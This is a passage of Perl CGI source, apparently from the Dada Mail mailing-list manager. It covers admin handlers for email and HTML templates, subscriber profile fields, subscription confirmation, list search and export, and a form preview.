        my $unsubscribed_message_subject     = $q->param('unsubscribed_message_subject')     || undef; 
        my $unsubscribed_message             = $q->param('unsubscribed_message')             || undef; 
        
        
        
        my $mailing_list_message_from_phrase = $q->param('mailing_list_message_from_phrase') || undef; 
        my $mailing_list_message_to_phrase   = $q->param('mailing_list_message_to_phrase')   || undef; 
        my $mailing_list_message_subject     = $q->param('mailing_list_message_subject')     || undef; 
        my $mailing_list_message             = $q->param('mailing_list_message')             || undef; 
        my $mailing_list_message_html        = $q->param('mailing_list_message_html')        || undef; 
       
        my $not_allowed_to_post_message_subject = $q->param('not_allowed_to_post_message_subject') || undef; 
        my $not_allowed_to_post_message = $q->param('not_allowed_to_post_message')   || undef; 
      
      
        my $send_archive_message_subject = $q->param('send_archive_message_subject') || undef; 
        my $send_archive_message        = $q->param('send_archive_message')          || undef; 
        my $send_archive_message_html   = $q->param('send_archive_message_html')     || undef; 
       
       
        my $you_are_already_subscribed_message_subject = $q->param('you_are_already_subscribed_message_subject') || undef;
        my $you_are_already_subscribed_message = $q->param('you_are_already_subscribed_message') || undef;

        my $invite_message_from_phrase = $q->param('invite_message_from_phrase')     || undef; 
        my $invite_message_to_phrase   = $q->param('invite_message_to_phrase')       || undef; 
		my $invite_message_text        = $q->param('invite_message_text')            || undef; 
		my $invite_message_html        = $q->param('invite_message_html')    || undef; 
		my $invite_message_subject     = $q->param('invite_message_subject') || undef; 

		my $enable_email_template_expr = $q->param('enable_email_template_expr') || 0;
		for(
            $subscribed_message_subject, 
            $subscribed_message,
            
            $unsubscribed_message_subject,
            $unsubscribed_message,
            
            $confirmation_message_subject, 
            $confirmation_message,
            
            $unsub_confirmation_message_subject,
            $unsub_confirmation_message, 
            
            
            $mailing_list_message_from_phrase,
            $mailing_list_message_to_phrase,
            $mailing_list_message_subject, 
            $mailing_list_message,
            $mailing_list_message_html,
            
            $not_allowed_to_post_message_subject, 
            $not_allowed_to_post_message,
            
            $send_archive_message_subject, 
            $send_archive_message,
            $send_archive_message_html,
            
            $you_are_already_subscribed_message_subject, 
            $you_are_already_subscribed_message, 

            $invite_message_from_phrase,
            $invite_message_to_phrase,            
			$invite_message_text,  
			$invite_message_html,  
			$invite_message_subject,

          ){
            s/\r\n/\n/g;
          
            # a very odd place to put this, but, hey,  easy enough. 
            if($q->param('revert')){ 
               $_ = undef; 
            }
          }
                    
        $ls->save({ 
                confirmation_message_subject =>   $confirmation_message_subject, 
                confirmation_message         =>   $confirmation_message,

                subscribed_message_subject   =>   $subscribed_message_subject, 
                subscribed_message           =>   $subscribed_message,
                
                unsubscribed_message_subject =>   $unsubscribed_message_subject, 
                unsubscribed_message         =>   $unsubscribed_message,
                
                unsub_confirmation_message_subject => $unsub_confirmation_message_subject, 
                unsub_confirmation_message         =>   $unsub_confirmation_message,
                
                mailing_list_message_from_phrase => $mailing_list_message_from_phrase, 
                mailing_list_message_to_phrase   => $mailing_list_message_to_phrase, 
                mailing_list_message_subject     => $mailing_list_message_subject, 
                mailing_list_message             => $mailing_list_message,
                mailing_list_message_html        => $mailing_list_message_html,
                
                not_allowed_to_post_message_subject => $not_allowed_to_post_message_subject, 
                not_allowed_to_post_message         =>   $not_allowed_to_post_message,
                
                send_archive_message_subject =>   $send_archive_message_subject,  
                send_archive_message         =>   $send_archive_message,
                send_archive_message_html    =>   $send_archive_message_html,
                
                you_are_already_subscribed_message_subject => $you_are_already_subscribed_message_subject, 
                you_are_already_subscribed_message => $you_are_already_subscribed_message, 

				invite_message_from_phrase       => $invite_message_from_phrase, 
                invite_message_to_phrase          => $invite_message_to_phrase,
				invite_message_text              => $invite_message_text, 
				invite_message_html              => $invite_message_html, 
				invite_message_subject           => $invite_message_subject, 
                
				enable_email_template_expr       => $enable_email_template_expr, 
				
                  });
                  
        print $q->redirect(-uri=>$DADA::Config::S_PROGRAM_URL . '?flavor=edit_type&done=1'); 
    
    }
}




sub edit_html_type { 

    my ($admin_list, $root_login) = check_list_security(-cgi_obj  => $q, 
                                                        -Function => 'edit_html_type');
    $list = $admin_list; 

    require DADA::MailingList::Settings;
           $DADA::MailingList::Settings::dbi_obj = $dbi_handle; 


    my $ls = DADA::MailingList::Settings->new({-list => $list}); 
    my $li = $ls->get; 



# Backwards Compatibility!
    require DADA::Template::Widgets;
    foreach(qw(
         html_confirmation_message      
         html_unsub_confirmation_message
         html_subscribed_message        
         html_unsubscribed_message      
        
    )){ 
        my $m = $li->{$_}; 
        DADA::Template::Widgets::dada_backwards_compatibility(\$m); 	
        $li->{$_} = $m;
    }
    
    

    if(!$process){ 
    
        print(admin_template_header(-Title      => "HTML Screen Templates", 
                                -List       => $list,
                                -Root_Login => $root_login));

        require DADA::Template::Widgets;
        print   DADA::Template::Widgets::screen({-screen => 'edit_html_type_screen.tmpl',
                                                -list   => $list,
                                                -vars   => { 
															screen                          => 'edit_html_type', 
															title                           => 'HTML Screen Templates', 
                                                            done                            => $done,  
                                                            html_confirmation_message       => $li->{html_confirmation_message},
                                                            html_unsub_confirmation_message => $li->{html_unsub_confirmation_message}, 
                                                            html_subscribed_message         => $li->{html_subscribed_message}, 
                                                            html_unsubscribed_message       => $li->{html_unsubscribed_message}, 
                                                        },
                                                }); 
        print(admin_template_footer(-List => $list));

    }
    else{ 


        my $html_confirmation_message       = $q->param('html_confirmation_message')       || ''; 
        my $html_unsub_confirmation_message = $q->param('html_unsub_confirmation_message') || '';
        my $html_subscribed_message         = $q->param('html_subscribed_message')         || '';
        my $html_unsubscribed_message       = $q->param('html_unsubscribed_message')       || '';


        for(
            $html_confirmation_message,
            $html_unsub_confirmation_message,
            $html_subscribed_message,
            $html_unsubscribed_message){
                s/\r\n/\n/g;
            } 

        $ls->save({ 
                    html_confirmation_message         =>   $html_confirmation_message,
                    html_unsub_confirmation_message   =>   $html_unsub_confirmation_message, 
                    html_subscribed_message           =>   $html_subscribed_message,
                    html_unsubscribed_message         =>   $html_unsubscribed_message
                  });

        print $q->redirect(-uri=>"$DADA::Config::S_PROGRAM_URL?flavor=edit_html_type&done=1"); 
    }
}




sub manage_script { 

    my ($admin_list, $root_login) = check_list_security(-cgi_obj  => $q,  
                                                        -Function => 'manage_script');
    
       $list                = $admin_list; 
    my $more_info           = $q->param('more_info') || 0;
    my $sendmail_locations    =`whereis sendmail`;
	my $curl_location         = `which curl`; 
	my $wget_location         = `which wget`; 
		
    my $at_incs             = []; 
	
	foreach(@INC){ 
		if($_ !~ /^\./){ 
    		push(@$at_incs, {name => $_});
		}
    }
    
    require DADA::MailingList::Settings;
           $DADA::MailingList::Settings::dbi_obj = $dbi_handle; 

    my $ls = DADA::MailingList::Settings->new({-list => $list}); 
    my $li = $ls->get; 
    
    
    
    print(admin_template_header(-Title      => "About $DADA::Config::PROGRAM_NAME", 
                            -List       => $li->{list},
                            -Root_Login => $root_login));
    
        require DADA::Template::Widgets;
        print   DADA::Template::Widgets::screen({-screen => 'manage_script_screen.tmpl', 
                                                -list   => $list, 
                                                -vars   => 
                                                { 
                                                    more_info          => $more_info, 
                                                    smtp_server        => $li->{smtp_server}, 
                                                    server_software    => $q->server_software(), 
                                                    operating_system   => $^O,
                                                    perl_version       => $], 
                                                    sendmail_locations => $sendmail_locations, 
                                                    at_incs            => $at_incs, 
                                                    list_owner_email   => $li->{list_owner_email},
													curl_location      => $curl_location, 
													wget_location      => $wget_location,
													
    
                                                },
                                                }); 
                                                
    print(admin_template_footer(-List => $list));
     
}




sub feature_set { 

    my ($admin_list, $root_login) = check_list_security(-cgi_obj  => $q,  
                                                        -Function => 'feature_set');
    $list = $admin_list; 
    
    require  DADA::MailingList::Settings; 

    my $ls = DADA::MailingList::Settings->new({-list => $list}); 
    my $li = $ls->get; 

    require DADA::Template::Widgets::Admin_Menu; 
    
    if(!$process){ 

    my $feature_set_menu = DADA::Template::Widgets::Admin_Menu::make_feature_menu($li); 
    
        print(admin_template_header(-Title      => "Customize Feature Set", 
                                -List       => $li->{list},
                                -Root_Login => $root_login,
                                , ));
        
        

        require DADA::Template::Widgets;
        print DADA::Template::Widgets::screen({-screen => 'feature_set_screen.tmpl', 
                                              
                                              -vars   => {
													   screen           => 'feature_set', 
													   title            => 'Customize Feature Set',
													
                                                       done             => (defined($done)) ? 1 : 0,
                                                       feature_set_menu => $feature_set_menu,
                                                       disabled_screen_view_hide     => ($li->{disabled_screen_view} eq 'hide')     ? 1 : 0, 
                                                       disabled_screen_view_grey_out => ($li->{disabled_screen_view} eq 'grey_out') ? 1 : 0, 
                                                       
                                                       
                                                       
                                                      },
                                             });        
        print(admin_template_footer(-List => $list, -End_Form   => 0));
    
    }else{ 
        
        my @params = $q->param; 
        my %param_hash; 
        foreach(@params){
            next if $_ eq 'disabled_screen_view'; # special case.
            $param_hash{$_} = $q->param($_);
        }    
        
            my $save_set = DADA::Template::Widgets::Admin_Menu::create_save_set(\%param_hash);        
            
            my $disabled_screen_view = $q->param('disabled_screen_view'); 
            
            $ls->save({ 
                        admin_menu           => $save_set,
                        disabled_screen_view => $disabled_screen_view, 
                      });

            print $q->redirect(-uri=>"$DADA::Config::S_PROGRAM_URL?flavor=feature_set&done=1"); 
        }
}



sub list_cp_options { 


   my ($admin_list, $root_login) =  check_list_security(-cgi_obj    => $q,
                                                        -Function   => 'list_cp_options');
   $list = $admin_list;

   require DADA::MailingList::Settings;
          $DADA::MailingList::Settings::dbi_obj = $dbi_handle; 

   my $ls = DADA::MailingList::Settings->new({-list => $list}) ; 
   my $li = $ls->get; 

   if(!$process){ 

    my @list_amount = (10,25,50,100,150,200,
                       250,300,350, 400,450,
                       500,550,600,650,700,
                       750,800,850,900,950,1000, 2000, 3000, 4000, 5000, 10000, 15000, 20000, 25000, 50000, 100000
                      );
	my $vlsn_menu = $q->popup_menu(
		-name     => 'view_list_subscriber_number',
		-values   => [ @list_amount],
		-default  => $li->{view_list_subscriber_number}
	);     

   print admin_template_header(
			-Title      => "Options", 
            -List       => $list, 
            -Root_Login => $root_login,
		 );

   require DADA::Template::Widgets;
   print   DADA::Template::Widgets::screen({-screen => 'list_cp_options.tmpl', 
                                               -list   => $list,
                                               -vars   => {
													screen    => 'list_cp_options', 
													title     => 'Options',
													vlsn_menu => $vlsn_menu, 
													done      => xss_filter($q->param('done')), 
												},
											-list_settings_vars       => $li, 
                                            -list_settings_vars_param => {-dot_it => 1},
                                           });

       print admin_template_footer(
				-List => $list
			);

   }else{ 


       my $enable_fckeditor 	       = xss_filter($q->param('enable_fckeditor'))      || 0;
       my $enable_mass_subscribe       = xss_filter($q->param('enable_mass_subscribe')) || 0; 
	   my $view_list_subscriber_number = xss_filter($q->param('view_list_subscriber_number')) || 0; 

       $ls->save(
			{
				enable_fckeditor	        => $enable_fckeditor, 
				enable_mass_subscribe       => $enable_mass_subscribe, 
				view_list_subscriber_number => $view_list_subscriber_number, 
 			}
		);

       print $q->redirect(-uri=>$DADA::Config::S_PROGRAM_URL . '?flavor=list_cp_options&done=1'); 
   }
}








sub subscriber_fields {

    my ($admin_list, $root_login) = check_list_security(-cgi_obj  => $q,  
                                                        -Function => 'subscriber_fields');
    
     $list  = $admin_list; 
     
	require DADA::ProfileFieldsManager; 
	my $pfm = DADA::ProfileFieldsManager->new; 
	
	require DADA::Profile::Fields; 
	my $dpf = DADA::Profile::Fields->new; 
	
	if($dpf->can_have_subscriber_fields == 0){ 
		print admin_template_header(
			-Title      => "Subscriber Profile Fields", 
			-List       => $list,
			-Root_Login => $root_login,
		);
	     require DADA::Template::Widgets;
	     print DADA::Template::Widgets::screen(
			{
				-screen => 'subscriber_fields.tmpl', 
				-vars   => {
					screen                     => 'subscriber_fields',
					title                      => 'Subscriber Profile Fields',       
					can_have_subscriber_fields => $dpf->can_have_subscriber_fields, 

				},
			}
		);        
		print admin_template_footer(
			-List => $list, 
		);
		return; 
	}
	
	
	 # But, if we do....
	 my $subscriber_fields = $pfm->fields; 

	 my $fields_attr = $pfm->get_all_field_attributes;

     my $ls = DADA::MailingList::Settings->new({-list => $list}); 
     my $li = $ls->get();

     my $field_errors = 0; 
     my $field_error_details = {
            field_blank            => 0, 
            field_name_too_long    => 0, 
            slashes_in_field_name  => 0, 
            weird_characters       => 0, 
            quotes                 => 0, 
            field_exists           => 0, 
            spaces                 => 0, 
            field_is_special_field => 0, 
     };
     
	
     my $edit_field           = xss_filter($q->param('edit_field'));
     
	 my $field                = ''; 
	 my $fallback_field_value = ''; 
	 my $field_label          = ''; 
	
	 if($edit_field == 1){ 
				$field                = xss_filter($q->param('field'));
				$fallback_field_value = $fields_attr->{$field}->{fallback_value};
				$field_label          = $fields_attr->{$field}->{label};
	 }
	else { 
		$field                = xss_filter($q->param('field'));
		$fallback_field_value = xss_filter($q->param('fallback_field_value'));
		$field_label          = xss_filter($q->param('field_label'));
	}
	
	 if(!$root_login && defined($process)){ 
         die "You need to log into the list with the root pass to do that!"; 
     }
	
	 if($process eq 'edit_field_order'){ 
		my $dir = $q->param('direction') || 'down'; 
		$pfm->change_field_order(
			{
				-field     => $field, 
				-direction => $dir, 
			}
		);
		print $q->redirect({-uri => $DADA::Config::S_PROGRAM_URL . '?f=subscriber_fields'}); 
        return; 
        
	 }
     if($process eq 'delete_field'){ 
     
		###
        $pfm->remove_field({-field => $field}); 
        
        print $q->redirect({-uri => $DADA::Config::S_PROGRAM_URL . '?f=subscriber_fields&deletion=1&working_field=' . $field}); 
        return; 
     }
     elsif($process eq 'add_field'){ 
 
        
        ($field_errors, $field_error_details) = $pfm->validate_field_name(
			{
				-field => $field
			}
		); 
      
        if($field_errors == 0){ 
        
            $pfm->add_field(
				{
					-field => $field, 
					-fallback_value => $fallback_field_value,
					-label          => $field_label, 
				}
			); 
			
            print $q->redirect({-uri => $DADA::Config::S_PROGRAM_URL . '?f=subscriber_fields&addition=1&working_field=' . $field}); 
            return;      
         }
         else { 
            # Else, I guess for now, we'll show the template and have the errors print out there...
            $field_errors = 1;
         }
     }
	 elsif($process eq 'edit_field'){ 
		
		my $orig_field = xss_filter($q->param('orig_field'));
		
		#old name			# new name
		if($orig_field eq $field){ 
		 	($field_errors, $field_error_details) = $pfm->validate_field_name({-field => $field, -skip => [qw(field_exists)]}); 
		}
		else { 
			($field_errors, $field_error_details) = $pfm->validate_field_name({-field => $field}); 			
		}
		 if($field_errors == 0){
			  
             $pfm->remove_field_attributes({-field => $orig_field});          	

			if($orig_field eq $field){ 
				# ...
			}
			else { 
            	$pfm->edit_field({-old_name => $orig_field ,-new_name => $field});	
			}
			$pfm->save_field_attributes(
				{  
					-field 			=> $field, 
					-fallback_value => $fallback_field_value,
					-label          => $field_label, 
				}
			);

			print $q->redirect({-uri => $DADA::Config::S_PROGRAM_URL . '?f=subscriber_fields&edited=1&working_field=' . $field}); 
             return;
		}
         else { 
            # Else, I guess for now, we'll show the template and have the errors print out there...
            $field_errors = 1;
			$edit_field   = 1;
			$field        = xss_filter($q->param('orig_field'));
         }
	 }
    
     my $named_subscriber_fields = [];
     foreach(@$subscriber_fields){ 
        push(
			@$named_subscriber_fields, 
				{
					field          => $_, 
					fallback_value => $fields_attr->{$_}->{fallback_value}, 
					label          => $fields_attr->{$_}->{label},  
					root_login     => $root_login,
				}
			);
     }
     
        print admin_template_header(
				-Title      => "Subscriber Profile Fields", 
                -List       => $li->{list},
                -Root_Login => $root_login,
              );
        require DADA::Template::Widgets;
        print DADA::Template::Widgets::screen({-screen => 'subscriber_fields.tmpl', 
                                               -vars   => {
														
													   screen                           => 'subscriber_fields',
													   title                            => 'Subscriber Profile Fields',       
													 
													   edit_field                       => $edit_field, 
                                                       fields                           => $named_subscriber_fields,
                                                       
                                                       field_errors                     => $field_errors, 
                                                       field_error_field_blank            => $field_error_details->{field_blank},
                                                       field_error_field_name_too_long    => $field_error_details->{field_name_too_long},
                                                       field_error_slashes_in_field_name  => $field_error_details->{slashes_in_field_name},
                                                       field_error_weird_characters       => $field_error_details->{weird_characters},
                                                       field_error_quotes                 => $field_error_details->{quotes}, 
                                                       field_error_field_exists           => $field_error_details->{field_exists},
                                                       field_error_spaces                 => $field_error_details->{spaces},
                                                       field_error_field_is_special_field => $field_error_details->{field_is_special_field}, 
                                                
                                                       field                            => $field, 
                                                       fallback_field_value             => $fallback_field_value, 
                                                       field_label                      => $field_label,
                                                       
													   can_have_subscriber_fields       => $dpf->can_have_subscriber_fields, 
                                                       
                                                       root_login                       => $root_login, 

                                                       HIDDEN_SUBSCRIBER_FIELDS_PREFIX  => $DADA::Config::HIDDEN_SUBSCRIBER_FIELDS_PREFIX, 
                                                      
														using_SQLite                     => $DADA::Config::SUBSCRIBER_DB_TYPE eq 'SQLite' ? 1 : 0, 
														working_field                    => xss_filter($q->param('working_field')), 
														deletion                         => xss_filter($q->param('deletion')),
														addition                         => xss_filter($q->param('addition')),
														edited                           => xss_filter($q->param('edited')), 
														
														can_move_columns                 => ($DADA::Config::SQL_PARAMS{dbtype} eq 'mysql') ? 1 : 0, 
														
													},
                                             });        
        print(admin_template_footer(-List => $list, -End_Form   => 0));

}




sub subscribe { 
    
    my %args = (-html_output => 1, @_);
        
    require DADA::App::Subscriptions; 
    my $das = DADA::App::Subscriptions->new; 
       $das->subscribe(
        {
            -cgi_obj     => $q, 
            -html_output => $args{-html_output}, 
            -dbi_handle  => $dbi_handle,
        }
    ); 
    
}




sub subscribe_flash_xml { 
        
    if($q->param('test') == 1){ 
        print $q->header('text/plain'); 
    }else{ 
        print $q->header('application/x-www-form-urlencoded'); 
    }
    
    if(check_if_list_exists(-List => $list, -dbi_handle => $dbi_handle) == 0){ 
        #note! This should be handled in the subscription_check_xml() method, 
        # but this object *also* checks to see if a list is real. Chick/Egg
        print '<subscription><email>' . $email . '</email><status>0</status><errors><error>no_list</error></errors></subscription>';
    }else{ 
        my $lh = DADA::MailingList::Subscribers->new({-list => $list}); 
        my ($xml, $status, $errors) =  $lh->subscription_check_xml(
											{
												-email => $email
											},
										); 
        print $xml;
    
        if($status == 1){ 
            subscribe(-html_output => 0); 
        }
    }
}




sub unsubscribe_flash_xml { 
        
    if($q->param('test') == 1){ 
        print $q->header('text/plain'); 
    }else{ 
        print $q->header('application/x-www-form-urlencoded'); 
    }
    
    if(check_if_list_exists(-List => $list, -dbi_handle => $dbi_handle) == 0){ 
        print '<unsubscription><email>' . $email . '</email><status>0</status><errors><error>no_list</error></errors></unsubscription>';
    }else{ 
        my $lh = DADA::MailingList::Subscribers->new({-list => $list}); 
        my ($xml, $status, $errors) =  $lh->unsubscription_check_xml(
											{
												-email => $email
											}
										); 
        print $xml;
        
        if($status == 1){ 
            unsubscribe(-html_output => 0); 
        }    
    }
}




sub unsubscribe { 

    my %args = (-html_output => 1, @_); 
     require DADA::App::Subscriptions; 
    my $das = DADA::App::Subscriptions->new; 
       $das->unsubscribe(
        {
            -cgi_obj     => $q, 
            -html_output => $args{-html_output}, 
            -dbi_handle  => $dbi_handle, 
        }
    ); 
    
}




sub confirm { 

    my %args = (-html_output => 1, @_) ;
   
    require DADA::App::Subscriptions; 
    my $das = DADA::App::Subscriptions->new; 
       $das->confirm(
        {
            -cgi_obj     => $q, 
            -html_output => $args{-html_output}, 
            -dbi_handle  => $dbi_handle, 
        }
    ); 
   
}




sub unsub_confirm { 

    print $q->header(); 
    
    my %args = (-html_output => 1, @_); 
     require DADA::App::Subscriptions; 
    my $das = DADA::App::Subscriptions->new; 
       $das->unsub_confirm(
        {
            -cgi_obj     => $q, 
            -html_output => $args{-html_output}, 
            -dbi_handle  => $dbi_handle, 
        }
    ); 
   
}





sub resend_conf {


    my $list_exists = check_if_list_exists(
						-List       => $list, 
						-dbi_handle => $dbi_handle
					);
    
    if($list_exists == 0){ 
        &default;
        return; 
    }
    if (!$email){ 
        $q->param('error_no_email', 1); 
        list_page(); 
        return; 
    }
    
    if($q->param('rm') ne 's' && $q->param('rm') ne 'u'){ 
        &default;
        return; 
    }
    
    if($q->request_method() !~ m/POST/i){ 
        &default;
        return; 
    }

    
    require DADA::MailingList::Settings;
           $DADA::MailingList::Settings::dbi_obj = $dbi_handle; 

    
    my $ls = DADA::MailingList::Settings->new({-list => $list}); 
    my $lh = DADA::MailingList::Subscribers->new({-list => $list}); 
    

	my ($sec, $min, $hour, $day, $month, $year) = (localtime)[0,1,2,3,4,5];


	# I'm assuming this happens if we FAILED this test below (1 = failure for check_email_pin) 
	#
	if(DADA::App::Guts::check_email_pin(
							-Email => $month . '.' . $day . '.' . $email, 
							-Pin   => xss_filter($q->param('auth_code')), 
							) 
							== 1
	){ 

		my ($e_day, $e_month, $e_stuff) = split('.', $email); 

		#  Ah, I see, it only is blocked for a... day? 
		#  But why have this check here? Shouldn't we have this check before we say, 
		#  "hey you can't confirm a subscription again?",  place? 
		#  Probably. 
		if($e_day != $day || $e_month != $month){ 
			# a stale blocking thingy.
			if($q->param('rm') eq 's'){
				my $rm_status = $lh->remove_from_list(-Email_List =>[$email], -Type => 'sub_confirm_list');    
			}elsif($q->param('rm') eq 'u'){
				my $rm_status = $lh->remove_from_list(-Email_List =>[$email], -Type => 'unsub_confirm_list');    
			}
		}

		# Like, you clicked the submit button wrong, what?!
		# Yeah, I guess - but this does not take into account Subscriber Profile Fields! 
		# What to do - just filled them into the CGI obj? (but we just removed them, correct? 
			
		#die "Yes this worked!"; 
		list_page(); 
		return; 
	}
	else { 
    
		#die "No, this didn't work!"; 

	    if($q->param('rm') eq 's'){
		
			my $sub_info = $lh->get_subscriber(
			                {
			                        -email => $email, 
			                        -type  => 'sub_confirm_list', 
			                }
			        );
			
	        my $rm_status = $lh->remove_from_list(
								-Email_List =>[$email], 
								-Type       => 'sub_confirm_list'
							);

			$q->param('list', $list);
			$q->param('email', $email); 
			$q->param('f', 's'); 
			&subscribe; 
	        return; 
    
	    }elsif($q->param('rm') eq 'u'){
			# I like the idea better that we call the function directly... 
	        my $rm_status = $lh->remove_from_list(-Email_List =>[$email], -Type => 'unsub_confirm_list');

			$q->param('list', $list);
			$q->param('email', $email); 
			$q->param('f', 'u'); 

			# And then, the Subscriber Profile Fields...
			# ... 
			# Well, we always pull the sub info from the, "list" sublist, no?x

			&unsubscribe; 
	        return; 
            
	    }

	}
}




sub search_list { 

    my ($admin_list, $root_login) = check_list_security(-cgi_obj  => $q,  
                                                        -Function => 'search_list');
    $list = $admin_list; 

    require  DADA::MailingList::Settings; 
    my $ls = DADA::MailingList::Settings->new({-list => $list}); 
    my $li = $ls->get; 
    
    my $lh = DADA::MailingList::Subscribers->new({-list => $list});

###
    # See, here's the thing - this is directly lifted from the view_list screen (Yes! I know! Sorry!)
    # pager stuff is supposed to have all sorts of bugs for home-brewed implementation. 
    # This below should have bugs, as does the view_list() screen. 
    # Hmm...
    # TODO would be to use something like this: 
    # http://search.cpan.org/~llap/Data-Pageset/lib/Data/Pageset.pm
    
    my $start                 = int($q->param('start')) || 0; 
    my $length                = $li->{view_list_subscriber_number}; 
    my $num_subscribers       = $lh->num_subscribers(-Type => $type);
    my $screen_finish         = $length+$start;
       $screen_finish         =  $num_subscribers if $num_subscribers < $length+$start;
    my $screen_start          = $start; 
       $screen_start          = 1 if (($start == 0) && ($num_subscribers != 0)); 
    my $previous_screen       = $start-$length; 
    my $next_screen           = $start+$length; 
    my $subscribers           =  $lh->search_list(
                                                  {
                                                      -query   => $keyword,
                                                      -type    => $type, 
                                                      -start   => $start, 
                                                     '-length' => $length,
                                                  }
                                              ); 
            
    if(defined($keyword)){ 

        print(admin_template_header(-Title      => "Search Email Subscribers: Search Results", 
                             -List       => $li->{list},
                             -Root_Login => $root_login,
                             -Form       => 0, 
                            ));
                         
        
        
        # DEV: Why isn't this its own method? It seems to be in the code in a whole bunch of places...
        my $field_names = []; 
        foreach(@{$lh->subscriber_fields}){ 
            push(@$field_names, {name => $_}); 
        }
        
        
         require DADA::Template::Widgets;
        print DADA::Template::Widgets::screen(
                                                {
                                                -screen => 'search_list_screen.tmpl', 
                                                -vars => {
                                                
                                                     field_names                 => $field_names,
                                                     subscribers                 => $subscribers,
                                                     
                                                     view_list_subscriber_number => $li->{view_list_subscriber_number},
                                                     next_screen                 => $next_screen,  
                                                     previous_screen             => $previous_screen, 
                                                     use_previous_screen         => ($start-$length >= 0 && $start > 0) ? 1 : 0, 
                                                     num_subscribers             => $num_subscribers, 
                                                     show_next_screen_link       => ($num_subscribers > ($start + $length)) ? 1 : 0, 
                                                     screen_start                => $screen_start, 
                                                     screen_finish               => $screen_finish, 
                                                     
                                                     type                        => $type,
                                                     flavor                      => 'search_list', 
                                                     
                                                     keyword                     => $keyword, 
                                                
                                                     list_type_label             => $list_types{$type}, 
                                                     
                                                     list_subscribers_num            => $lh->num_subscribers(-Type => 'list'), 
                                                     black_list_subscribers_num      => $lh->num_subscribers(-Type => 'black_list'), 
                                                     white_list_subscribers_num      => $lh->num_subscribers(-Type => 'white_list'), 
                                                     authorized_senders_num          => $lh->num_subscribers(-Type => 'authorized_senders'), 
                                                 
                                                 
                                                     #This sucks.
                                                     list_type_isa_list                  => ($type eq 'list')       ? 1 : 0, 
                                                     list_type_isa_black_list            => ($type eq 'black_list') ? 1 : 0, 
                                                     list_type_isa_authorized_senders    => ($type eq 'authorized_senders') ? 1 : 0, 
                                                     list_type_isa_testers               => ($type eq 'testers')    ? 1 : 0, 
                                                     list_type_isa_white_list            => ($type eq 'white_list') ? 1 : 0, 
                                                     
                                                     
                                                }
                                                });



        print(admin_template_footer(-List => $list, -Form => 0));

    }else{ 
        print $q->redirect(-uri => $DADA::Config::S_PROGRAM_URL . '?f=view_list&type=' . $type); 
        return; 
    } 
}




sub text_list { 

    my ($admin_list, $root_login) = check_list_security(
										-cgi_obj  => $q,  
                                        -Function => 'text_list'
									);
                                                        
    $list = $admin_list; 

    require  DADA::MailingList::Settings; 
    my $ls = DADA::MailingList::Settings->new({-list => $list}); 
    my $li = $ls->get; 
    
    my $lh = DADA::MailingList::Subscribers->new({-list => $list});

    my $email; 
    print $q->header('text/plain');
    print "Email Addresses for List: " .  $li->{list_name} . "\n"; 
    print "=" x 72, "\n"; 
    
	my $email_count =  $lh->print_out_list(-List=>$list, -Type => $type); 
    
	print "=" x 72, "\n"; 
    print "Total: $email_count \n\n"; 

}





sub send_list_to_admin { 
 

    my ($admin_list, $root_login) = check_list_security(-cgi_obj  => $q,  
                                                        -Function => 'send_list_to_admin');

    $list = $admin_list; 

    require  DADA::MailingList::Settings; 
    my $ls = DADA::MailingList::Settings->new({-list => $list}); 
    my $li = $ls->get; 
    
 my $email; 
 
 my ($sec, $min, $hour, $day, $month, $year) = (localtime)[0,1,2,3,4,5];
 $year = $year + 1900; 
 $month = $month + 1;  

my $lh = DADA::MailingList::Subscribers->new({-list => $list});

my $tmp_file = $lh->write_plaintext_list(-Type => $type); 
  

my $message = <<EOF

Attached to this email is the subscriber list for $li->{list_name} 
as of $month/$day/$year - $hour:$min:$sec. 
 
This was sent to the list owner ($li->{list_owner_email}) from the list control panel.
 
    -$DADA::Config::PROGRAM_NAME
EOF
; 
 
require MIME::Lite;
MIME::Lite->quiet(1) 
	if $DADA::Config::MIME_HUSH == 1;       ### I know what I'm doing 
$MIME::Lite::PARANOID = $DADA::Config::MIME_PARANOID;
 
my $msg = MIME::Lite->new(Type => 'multipart/mixed'); 


$msg -> attach(Type => 'TEXT',  
               Data => $message); 


my $listname  = $li->{list} . '_' . $type . '.list'; 


$msg->attach(Type        => 'TEXT', 
             Path        =>  $tmp_file,
             Filename    =>  $listname, 
             Disposition =>  'inline', 
             Encoding    => $li->{plaintext_encoding}, 
             ); 

$msg->replace('X-Mailer' =>"");
               
my $msg_headers = $msg->header_as_string();
my $msg_body    = $msg->body_as_string();              

require DADA::Mail::Send; 
my $mh = DADA::Mail::Send->new(
			{
				-list   => $list, 
				-ls_obj => $ls,
			}
		
		 ); 

my %mail_headers = $mh->return_headers($msg_headers);
my %mailing = ( 
   %mail_headers, 
    To        =>  '"'. escape_for_sending($li->{list_name}) .'" <'. $li->{list_owner_email} .'>', 
    Subject        =>    "$li->{list_name} $type subscriber list $month/$day/$year",        
    Body           =>     $msg_body,
    );
    
$mh->send(%mailing); 

unlink($tmp_file);
    
print $q->redirect(-uri => "$DADA::Config::S_PROGRAM_URL?flavor=view_list&type=" . $type);    

} 

sub preview_form { 

my $code = $q->param("code"); 

    my ($admin_list, $root_login) = check_list_security(-cgi_obj  => $q,
                                                        -Function => 'preview_form');

print $q->header(); 
       
print <<EOF

<html> 
 <head> 
  <title>Form Preview</title> 
 </head> 
 <body bgcolor="#ffffff">
  <table width="100%" height="100%" align="center"> 
   <tr>
    <td align="center"> 
     <p>$code</p> 
     <p><a href="#" onclick="self.close();">close the window</a></p> 
    </td> 
   </tr> 
  </table>
 </body> 
</html> 

EOF
;

}

sub new_list {

    require DADA::Security::Password;  
    my $root_password = $q->param('root_password');
    my $agree         = $q->param('agree');
    
    if(!$process) { 
    
        my $errors = shift; 
        my $flags  = shift; 
        my $pw_check;
        	
       if($DADA::Config::DISABLE_OUTSIDE_LOGINS == 1){        	
            require DADA::Security::SimpleAuthStringState; 
            my $sast =  DADA::Security::SimpleAuthStringState->new;  
            my $auth_state = $q->param('auth_state'); 
            
            if($sast->check_state($auth_state) != 1){ 
                user_error(-List => undef, -Error => 'incorrect_login_url');
                return; 
            }

        }
        
        if(!$DADA::Config::PROGRAM_ROOT_PASSWORD){ 
            user_error(-List => $list, -Error => "no_root_password");
            return; 
        }elsif($DADA::Config::ROOT_PASS_IS_ENCRYPTED == 1){ 
            #encrypted password check
            $pw_check = DADA::Security::Password::check_password($DADA::Config::PROGRAM_ROOT_PASSWORD, $root_password);
        }else{ 
            # unencrypted password check
            if($DADA::Config::PROGRAM_ROOT_PASSWORD eq $root_password){$pw_check = 1}
        }
    
        if ($pw_check == 1){
        
